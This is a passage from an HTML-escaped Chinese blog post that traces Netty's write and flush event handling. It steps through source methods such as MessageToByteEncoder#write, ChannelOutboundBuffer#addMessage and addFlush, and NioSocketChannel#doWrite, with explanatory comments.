            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; step1. write 事件写数据到缓冲区&lt;/span&gt;
&lt;span&gt;            invokeWrite0(msg, promise);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; step2. flush 事件写缓冲区数据到对端&lt;/span&gt;
&lt;span&gt;            invokeFlush0();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            writeAndFlush(msg, promise);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h4&gt;4.1 netty write 的事件如何处理&lt;/h4&gt;
&lt;p&gt;　　write 含义明确，写数据到xxx。那这是如何实现的呢？（仅从应用层分析，咱们就不讨论底层TCP协议了）&lt;/p&gt;
&lt;p&gt;　　实际上，它就是write事件的传播过程，最终由 head 节点处理。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;67&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; invokeWrite0(Object msg, ChannelPromise promise) {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; write 传递&lt;/span&gt;
            ((ChannelOutboundHandler) handler()).write(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, msg, promise);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
            notifyOutboundHandlerException(t, promise);
        }
    }
    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此处由 encoder 进行处理
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.handler.codec.MessageToByteEncoder#write&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        ByteBuf buf &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (acceptOutboundMessage(msg)) {
                @SuppressWarnings(&lt;/span&gt;&quot;unchecked&quot;&lt;span&gt;)
                I cast &lt;/span&gt;=&lt;span&gt; (I) msg;
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 分配byteBuf, 处理输出，和读取一样，可以使用 DirectByteBuffer&lt;/span&gt;
                buf =&lt;span&gt; allocateBuffer(ctx, cast, preferDirect);
                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 调用业务实现的 encode 方法，写数据到 buf 中&lt;/span&gt;
&lt;span&gt;                    encode(ctx, cast, buf);
                } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
                    ReferenceCountUtil.release(cast);
                }

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (buf.isReadable()) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果被写入数据到 buf 中，则传播write事件
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 直到head 完成&lt;/span&gt;
&lt;span&gt;                    ctx.write(buf, promise);
                } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                    buf.release();
                    ctx.write(Unpooled.EMPTY_BUFFER, promise);
                }
                buf &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                ctx.write(msg, promise);
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (EncoderException e) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; e;
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable e) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; EncoderException(e);
        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (buf != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                buf.release();
            }
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ByteBuf ioBuffer() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (PlatformDependent.hasUnsafe()) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; directBuffer(DEFAULT_INITIAL_CAPACITY);
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; heapBuffer(DEFAULT_INITIAL_CAPACITY);
    }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; head 节点会处理具体的写入细节&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
            unsafe.write(msg, promise);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannel.AbstractUnsafe#write&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; write(Object msg, ChannelPromise promise) {
            assertEventLoop();

            ChannelOutboundBuffer outboundBuffer &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.outboundBuffer;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (outboundBuffer == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If the outboundBuffer is null we know the channel was closed and so
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; need to fail the future right away. If it is not null the handling of the rest
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; will be done in flush0()
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2362&lt;/span&gt;
&lt;span&gt;                safeSetFailure(promise, WRITE_CLOSED_CHANNEL_EXCEPTION);
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; release message now to prevent resource-leak&lt;/span&gt;
&lt;span&gt;                ReferenceCountUtil.release(msg);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }

            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; size;
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 处理为 DirectByteBuffer&lt;/span&gt;
                msg =&lt;span&gt; filterOutboundMessage(msg);
                size &lt;/span&gt;=&lt;span&gt; pipeline.estimatorHandle().size(msg);
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (size &amp;lt; 0&lt;span&gt;) {
                    size &lt;/span&gt;= 0&lt;span&gt;;
                }
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                safeSetFailure(promise, t);
                ReferenceCountUtil.release(msg);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加数据到 outboundBuffer 中，即输出缓冲区&lt;/span&gt;
&lt;span&gt;            outboundBuffer.addMessage(msg, size, promise);
        }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.AbstractNioByteChannel#filterOutboundMessage&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;&lt;span&gt; Object filterOutboundMessage(Object msg) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (msg &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; ByteBuf) {
            ByteBuf buf &lt;/span&gt;=&lt;span&gt; (ByteBuf) msg;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (buf.isDirect()) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; msg;
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; newDirectBuffer(buf);
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (msg &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; FileRegion) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; msg;
        }

        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException(
                &lt;/span&gt;&quot;unsupported message type: &quot; + StringUtil.simpleClassName(msg) +&lt;span&gt; EXPECTED_TYPES);
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.ChannelOutboundBuffer#addMessage&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Add given message to this {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelOutboundBuffer}. The given {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelPromise} will be notified once
     * the message was written.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; addMessage(Object msg, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size, ChannelPromise promise) {
        Entry entry &lt;/span&gt;=&lt;span&gt; Entry.newInstance(msg, size, total(msg), promise);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (tailEntry == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            flushedEntry &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            Entry tail &lt;/span&gt;=&lt;span&gt; tailEntry;
            tail.next &lt;/span&gt;=&lt;span&gt; entry;
        }
        tailEntry &lt;/span&gt;=&lt;span&gt; entry;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (unflushedEntry == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            unflushedEntry &lt;/span&gt;=&lt;span&gt; entry;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; increment pending bytes after adding message to the unflushed arrays.
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/1619&lt;/span&gt;
        incrementPendingOutboundBytes(entry.pendingSize, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; incrementPendingOutboundBytes(&lt;span&gt;long&lt;/span&gt; size, &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; invokeLater) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (size == 0&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; newWriteBufferSize = TOTAL_PENDING_SIZE_UPDATER.addAndGet(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, size);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (newWriteBufferSize &amp;gt;&lt;span&gt; channel.config().getWriteBufferHighWaterMark()) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 超出一定数量后，需要主动flush&lt;/span&gt;
&lt;span&gt;            setUnwritable(invokeLater);
        }
    }
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setUnwritable(&lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; invokeLater) {
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (;;) {
            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; oldValue =&lt;span&gt; unwritable;
            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; newValue = oldValue | 1&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (UNWRITABLE_UPDATER.compareAndSet(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, oldValue, newValue)) {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oldValue == 0 &amp;amp;&amp;amp; newValue != 0&lt;span&gt;) {
                    fireChannelWritabilityChanged(invokeLater);
                }
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            }
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　即write只向 outboundBuffer中写入数据，应该是比较快速的。但它也是经历了 pipeline 的事件流的层层处理，如果想在这其中做点什么，也是比较方便的。&lt;/p&gt;

&lt;h4&gt;4.2 flush 事件流处理&lt;/h4&gt;
&lt;p&gt;　　上面一步写入数据到 outboundBuffer 中，并未向对端响应数据，需要进行 flush 对端才能感知到。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;78&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; invokeWriteAndFlush(Object msg, ChannelPromise promise) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (invokeHandler()) {
            invokeWrite0(msg, promise);
            invokeFlush0();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            writeAndFlush(msg, promise);
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#invokeFlush0&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; invokeFlush0() {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 由 MessageEncoder 处理&lt;/span&gt;
            ((ChannelOutboundHandler) handler()).flush(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
            notifyHandlerException(t);
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.ChannelOutboundHandlerAdapter#flush&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Calls {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelHandlerContext#flush()} to forward
     * to the next {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelOutboundHandler} in the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelPipeline}.
     *
     * Sub-classes may override this method to change behavior.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; flush(ChannelHandlerContext ctx) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        ctx.flush();
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#flush&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ChannelHandlerContext flush() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 出站handler, 依次调用， 直到head&lt;/span&gt;
        &lt;span&gt;final&lt;/span&gt; AbstractChannelHandlerContext next =&lt;span&gt; findContextOutbound();
        EventExecutor executor &lt;/span&gt;=&lt;span&gt; next.executor();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (executor.inEventLoop()) {
            next.invokeFlush();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            Runnable task &lt;/span&gt;=&lt;span&gt; next.invokeFlushTask;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (task == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                next.invokeFlushTask &lt;/span&gt;= task = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
                    @Override
                    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
                        next.invokeFlush();
                    }
                };
            }
            safeExecute(executor, task, channel().voidPromise(), &lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; invokeFlush() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (invokeHandler()) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 遍历 pipeline&lt;/span&gt;
&lt;span&gt;            invokeFlush0();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            flush();
        }
    }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; head 节点负责最终的数据flush
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.DefaultChannelPipeline.HeadContext#flush&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; flush(ChannelHandlerContext ctx) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; unsafe 为 NioSocketChannel$NioSocketChannelUnsafe&lt;/span&gt;
&lt;span&gt;            unsafe.flush();
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannel.AbstractUnsafe#flush&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; flush() {
            assertEventLoop();

            ChannelOutboundBuffer outboundBuffer &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.outboundBuffer;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (outboundBuffer == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }

            outboundBuffer.addFlush();
            flush0();
        }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.ChannelOutboundBuffer#addFlush&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Add a flush to this {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelOutboundBuffer}. This means all previous added messages are marked as flushed
     * and so you will be able to handle them.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addFlush() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; There is no need to process all entries if there was already a flush before and no new messages
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; where added in the meantime.
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2577&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用 unflushedEntry 保存要被 flush 的数据&lt;/span&gt;
        Entry entry =&lt;span&gt; unflushedEntry;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (entry != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (flushedEntry == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; there is no flushedEntry yet, so start with the entry&lt;/span&gt;
                flushedEntry =&lt;span&gt; entry;
            }
            &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt; {
                flushed &lt;/span&gt;++&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;entry.promise.setUncancellable()) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Was cancelled so make sure we free up memory and notify about the freed bytes&lt;/span&gt;
                    &lt;span&gt;int&lt;/span&gt; pending =&lt;span&gt; entry.cancel();
                    decrementPendingOutboundBytes(pending, &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
                }
                entry &lt;/span&gt;=&lt;span&gt; entry.next;
            } &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (entry != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; All flushed so reset unflushedEntry&lt;/span&gt;
            unflushedEntry = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }
    }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.AbstractNioChannel.AbstractNioUnsafe#flush0&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; flush0() {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Flush immediately only when there's no pending flush.
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If there's a pending flush operation, event loop will call forceFlush() later,
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and thus there's no need to call it now.
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第一次进入此处，将会尝试立即向socket中写入数据或者立即注册一个 OP_WRITE 事件，以触发写&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;isFlushPending()) {
                &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;.flush0();
            }
        }
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isFlushPending() {
            SelectionKey selectionKey &lt;/span&gt;=&lt;span&gt; selectionKey();
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; selectionKey.isValid() &amp;amp;&amp;amp; (selectionKey.interestOps() &amp;amp; SelectionKey.OP_WRITE) != 0&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannel.AbstractUnsafe#flush0&lt;/span&gt;
        @SuppressWarnings(&quot;deprecation&quot;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; flush0() {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (inFlush0) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Avoid re-entrance&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }

            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; ChannelOutboundBuffer outboundBuffer = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.outboundBuffer;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (outboundBuffer == &lt;span&gt;null&lt;/span&gt; ||&lt;span&gt; outboundBuffer.isEmpty()) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }

            inFlush0 &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Mark all pending write requests as failure if the channel is inactive.&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;isActive()) {
                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isOpen()) {
                        outboundBuffer.failFlushed(FLUSH0_NOT_YET_CONNECTED_EXCEPTION, &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
                    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Do not trigger channelWritabilityChanged because the channel is closed already.&lt;/span&gt;
                        outboundBuffer.failFlushed(FLUSH0_CLOSED_CHANNEL_EXCEPTION, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
                    }
                } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
                    inFlush0 &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }

            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                doWrite(outboundBuffer);
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (t &lt;span&gt;instanceof&lt;/span&gt; IOException &amp;amp;&amp;amp;&lt;span&gt; config().isAutoClose()) {
                    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
                     * Just call {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #close(ChannelPromise, Throwable, boolean)} here which will take care of
                     * failing all flushed messages and also ensure the actual close of the underlying transport
                     * will happen before the promises are notified.
                     *
                     * This is needed as otherwise {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #isActive()} , {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #isOpen()} and {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #isWritable()}
                     * may still return {&lt;/span&gt;&lt;span&gt;@code&lt;/span&gt;&lt;span&gt; true} even if the channel should be closed as result of the exception.
                     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
                    close(voidPromise(), t, FLUSH0_CLOSED_CHANNEL_EXCEPTION, &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
                } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                        shutdownOutput(voidPromise(), t);
                    } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t2) {
                        close(voidPromise(), t2, FLUSH0_CLOSED_CHANNEL_EXCEPTION, &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
                    }
                }
            } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
                inFlush0 &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            }
        }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.socket.nio.NioSocketChannel#doWrite&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; doWrite(ChannelOutboundBuffer in) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        SocketChannel ch &lt;/span&gt;=&lt;span&gt; javaChannel();
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; writeSpinCount =&lt;span&gt; config().getWriteSpinCount();
        &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (in.isEmpty()) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; All written so clear OP_WRITE&lt;/span&gt;
&lt;span&gt;                clearOpWrite();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Directly return here so incompleteWrite(...) is not called.&lt;/span&gt;
